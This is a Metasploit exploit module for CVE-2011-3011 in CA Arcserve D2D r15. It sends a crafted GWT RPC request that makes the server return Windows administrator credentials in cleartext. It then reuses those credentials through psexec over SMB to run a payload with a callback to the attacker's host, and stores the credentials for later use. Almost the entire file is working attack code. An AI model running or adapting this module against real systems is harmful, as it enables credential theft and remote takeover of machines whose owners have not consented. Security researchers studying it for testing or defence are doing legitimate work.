# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;CA Arcserve D2D GWT RPC Credential Information Disclosure&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an information disclosure vulnerability in the CA Arcserve
        D2D r15 web server. The information disclosure can be triggered by sending a
        specially crafted RPC request to the homepage servlet. This causes CA Arcserve to
        disclosure the username and password in cleartext used for authentication. This
        username and password pair are Windows credentials with Administrator access.
      },
      &#039;Author&#039;         =>
        [
          &#039;bannedit&#039;, # metasploit module
          &#039;rgod&#039;, # original public exploit
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2011-3011&#039; ],
          [ &#039;OSVDB&#039;, &#039;74162&#039; ],
          [ &#039;EDB&#039;, &#039;17574&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;
        },
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1000,
          &#039;BadChars&#039; => "\x00\x0d\x0a"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 25 2011&#039;,
      &#039;DefaultTarget&#039; => 0))
 
 
    register_options(
      [
        Opt::RPORT(8014),
      ], self.class )
  end
 
  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: &#039;tcp&#039;,
      workspace_id: myworkspace_id
    }
 
    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      private_data: opts[:password],
      origin_type: :service,
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)
 
    login_data = {
      core: create_credential(credential_data),
      status: opts[:status],
      last_attempted_at: DateTime.now
    }.merge(service_data)
 
    create_credential_login(login_data)
  end
 
  def exploit
    print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
 
    data  = "5|0|4|"
    data << "http://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}"
    data << "/contents/"
    data << "|2C6B33BED38F825C48AE73C093241510|"
    data << "com.ca.arcflash.ui.client.homepage.HomepageService"
    data << "|getLocalHost|1|2|3|4|0|"
 
    cookie = "donotshowgettingstarted=%7B%22state%22%3Atrue%7D"
 
    res = send_request_raw({
      &#039;uri&#039;     => &#039;/contents/service/homepage&#039;,
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;cookie&#039;  => cookie,
      &#039;data&#039;    => data,
      &#039;headers&#039; =>
      {
        &#039;Content-Type&#039;  => "text/x-gwt-rpc; charset=utf-8",
        &#039;Content-Length&#039; => data.length
      }
    }, 5)
 
    if not res
      fail_with(Failure::NotFound, &#039;The server did not respond to our request&#039;)
    end
 
    resp = res.to_s.split(&#039;,&#039;)
 
    user_index = resp.index("\"user\"")
    pass_index = resp.index("\"password\"")
 
    if user_index.nil? and pass_index.nil?
      # Not a vulnerable server (blank user/pass doesn&#039;t help us)
      fail_with(Failure::NotFound, &#039;The server did not return credentials&#039;)
    end
 
    user = resp[user_index+1].gsub(/\"/, "")
    pass = ""
 
    if pass_index
      pass = resp[pass_index+1].gsub(/\"/, "")
    end
 
    srvc = {
        :host   => datastore[&#039;RHOST&#039;],
        :port   => datastore[&#039;RPORT&#039;],
        :proto  => &#039;tcp&#039;,
        :name   => &#039;http&#039;,
        :info   => res.headers[&#039;Server&#039;] || ""
      }
    report_service(srvc)
    if user.nil? or pass.nil?
      print_error("Failed to collect the username and password")
      return
    end
 
    print_good("Collected credentials User: &#039;#{user}&#039; Password: &#039;#{pass}&#039;")
 
    # try psexec on the remote host
    psexec = framework.exploits.create("windows/smb/psexec")
    psexec.register_parent(self)
 
    psexec.datastore[&#039;PAYLOAD&#039;] = self.datastore[&#039;PAYLOAD&#039;]
 
    if self.datastore[&#039;LHOST&#039;] and self.datastore[&#039;LPORT&#039;]
      psexec.datastore[&#039;LHOST&#039;] = self.datastore[&#039;LHOST&#039;]
      psexec.datastore[&#039;LPORT&#039;] = self.datastore[&#039;LPORT&#039;]
    end
 
    psexec.datastore[&#039;RHOST&#039;] = self.datastore[&#039;RHOST&#039;]
 
    psexec.datastore[&#039;DisablePayloadHandler&#039;] = true
    psexec.datastore[&#039;SMBPass&#039;] = pass
    psexec.datastore[&#039;SMBUser&#039;] = user
 
    print_status("Attempting to login via windows/smb/psexec")
 
    # this is kind of nasty would be better to split psexec code out to a mixin (on the TODO List)
    begin
      psexec.exploit_simple(
        &#039;LocalInput&#039;  => self.user_input,
        &#039;LocalOutput&#039; => self.user_output,
        &#039;Payload&#039;  => psexec.datastore[&#039;PAYLOAD&#039;],
        &#039;RunAsJob&#039; => true
      )
    rescue
      report_cred(
        ip: datastore[&#039;RHOST&#039;],
        port: 445,
        service_name: &#039;smb&#039;,
        user: user,
        password: pass,
        status: Metasploit::Model::Login::Status::INCORRECT
      )
 
      print_status("Login attempt using windows/smb/psexec failed")
      print_status("Credentials have been stored and may be useful for authentication against other services.")
      # report the auth
      return
    end
 
    # report the auth
    report_cred(
      ip: datastore[&#039;RHOST&#039;],
      port: 445,
      service_name: &#039;smb&#039;,
      user: user,
      password: pass,
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    )
 
    handler
  end
end

